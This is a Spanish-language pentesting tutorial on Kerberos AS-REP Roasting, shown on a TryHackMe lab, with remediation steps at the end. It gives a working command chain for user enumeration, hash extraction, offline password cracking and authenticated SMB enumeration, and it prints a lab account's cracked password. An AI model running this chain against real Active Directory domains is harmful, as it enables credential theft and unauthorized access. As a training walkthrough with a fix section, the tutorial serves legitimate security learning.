<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=19&pause=1000&color=D1F700&width=350&lines=Ataque+de+AS-REP+Roasting"></a>
</p>

<h1 align="center"></h1>

<h3 align="center"><ins>Autenticación Kerberos y ataque AS-REP Roasting</ins></h3>

El protocolo Kerberos es usado en la autenticación en entornos Windows/Active Directory (AD). Este permite que los usuarios y servicios se puedan autenticar entre sí de forma segura usando tickets en lugar de enviar las contraseñas.

El flujo típico de autenticación Kerberos funciona de la siguiente manera:
- [AS-REQ] El usuario pide autenticarse al Domain Controller (KDC), enviando su nombre cifrado.

- [AS-REP] El KDC responde con un Ticket Granting Ticket (TGT), cifrado con la clave del usuario.

- El usuario usa ese TGT para pedir acceso a otros servicios (correo, archivos, etc.).

- [TGS-REQ / TGS-REP] Se generan otros tickets para los servicios deseados (como HTTP, CIFS).

El AS-REP Roasting explota cuentas del AD que tienen mala configuración: "Do not require Kerberos preauthentication" (**UF_DONT_REQUIRE_PREAUTH**)". Normalmente, el usuario debe cifrar un timestamp con su contraseña para probar que es él (pre-autenticación), pero si esa opción está desactivada, cualquiera puede pedirle un ASP-REP al DC (Domain Controller) solo sabiendo únicamente el nombre de usuario.

<p align="center">
  <img src="https://github.com/R3LI4NT/articulos/blob/main/Pentesting/O.S/img/AS-REP_Roasting_esq.png">
</p>

<h1 align="center"></h1>

### Enumeración de usuarios | Kerbrute
Para el siguiente ejemplo voy a utilizar la máquina <a href="https://tryhackme.com/room/attacktivedirectory">Attacktive Directory</a> de TryHackMe para mostrar el funcionamiento del ataque. 

<img width="1065" height="256" alt="tryhackme" src="https://github.com/user-attachments/assets/95c6e049-19bf-4d74-a71c-3ea7dae8514c" />


Lo primero que debemos hacer es identificar el nombre del dominio, lo cual podemos lograr utilizando Nmap como se muestra a continuación.
```
nmap -p- --open -sS -vvv -n -Pn <IP>
```

<img width="812" height="236" alt="1" src="https://github.com/user-attachments/assets/a9ef42b3-fd0d-468f-b19c-1f43655763f8" />

```
nmap -p 389,636,3268,3269,88,445 --script ldap-search,ldap-rootdse <IP>
```
<img width="1027" height="451" alt="2" src="https://github.com/user-attachments/assets/94968195-854e-4d2d-8e50-69a009a7e518" />

Luego de identificar el nombre de dominio (`spookysec.local`), utilizando la herramienta de <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> se procederá a realizar una enumeración de usuarios utilizando una wordlist propia o pública como <a href="https://github.com/danielmiessler/SecLists">SecLists</a>.
```
./kerbrute userenum --dc <IP> -d <nombre-dominio> <wordlist.txt>
```
<img width="860" height="446" alt="3" src="https://github.com/user-attachments/assets/125bee0f-18f0-430b-9101-4cf213c3e404" />

Conseguimos enumerar 10 usuarios, creamos un archivo y guardamos los usuarios enumerados. Posteriormente, utilizando la herramienta GetNPUsers de <a href="https://github.com/fortra/impacket">Impacket</a> buscamos aquellos usuarios sin pre-autenticación Kerberos.
```
impacket-GetNPUsers <nombre-dominio/> -no-pass -usersfile <usuarios.txt> -dc-ip <IP>
```

<img width="572" height="287" alt="4" src="https://github.com/user-attachments/assets/4bb32a24-095a-4329-90ea-b160d14ac621" />

<img width="1336" height="406" alt="5" src="https://github.com/user-attachments/assets/92f9e7e8-9501-4ce5-8588-94bdca79efae" />

El usuario `svc-admin` devolvió su hash Kerberos. Lo que haremos es guardar el hash en un archivo para su posterior crackeo.
```
echo 'HASH' > <hash.hash>
```

<img width="1336" height="258" alt="6" src="https://github.com/user-attachments/assets/abeb58aa-b47c-4168-ab79-f901c5e3ab8d" />

Finalmente, utilizamos la herramienta HashCat para intentar descifrar la contraseña. Tengan en cuenta que el tiempo necesario para realizar el crackeo dependerá de los recursos de hardware disponibles, del diccionario utilizado y del tiempo de ejecución.
```
hashcat -m 18200 <hash.hash> <wordlist.txt> --force
```

<img width="1338" height="429" alt="7" src="https://github.com/user-attachments/assets/b0fe90cf-2cf9-422c-b8b1-a02b5d4c50bb" />

En caso de que quieran utilizar John para crackear el hash, lo pueden hacer con el siguiente comando.
```
john <wordlist.txt> <hash.hash>
```

<img width="1038" height="215" alt="8" src="https://github.com/user-attachments/assets/69110c35-35e1-411a-94f9-c9df2c903ecb" />

Luego de que el atacante conozca el usuario (**svc-admin**) y su contraseña (**management2005**) podrá autenticarse al Domain Controller y <a href="https://github.com/R3LI4NT/articulos/blob/main/Pentesting/O.S/SMB_enumeration.md">enumerar recursos compartidos SMB</a> de forma autenticada.
```
netexec smb <IP> -u '<usuario>' -p '<password>' --shares
```

<img width="1334" height="276" alt="9" src="https://github.com/user-attachments/assets/30c2104f-8856-415c-b035-98b70532006e" />

Así como también enumerar otros usuarios del AD.
```
netexec smb <IP> -u '<usuario>' -p '<password>' --users
```

<img width="1334" height="442" alt="10" src="https://github.com/user-attachments/assets/a8083d6c-f3ba-4db0-8e59-23338f243672" />

<h1 align="center"></h1>

</br>

#### SOLUCIÓN
Para solucionar la vulnerabilidad de "AS-REP Roasting" es necesario habilitar la preautenticación Kerberos de aquellas cuentas afectadas.

Pasos:
- **1:** Abrir `Active Directory Users and Computers` (ADUC)
- **2:** Buscar el o los usuarios afectados.
- **3:** Ir a pestaña de `Account` y asegurarse de que NO esté marcada la opción "_Do not require Kerberos preauthenticatiom_".

</br>

<h1 align="center"></h1>

<h3 align="center"><ins>ADVERTENCIA<ins></h3>

<h4 align="center">Esto es con fines de aprendizaje, no nos hacemos responsables ni el fundador, ni el creador del tema del mal uso de esta herramienta u información.</h4>
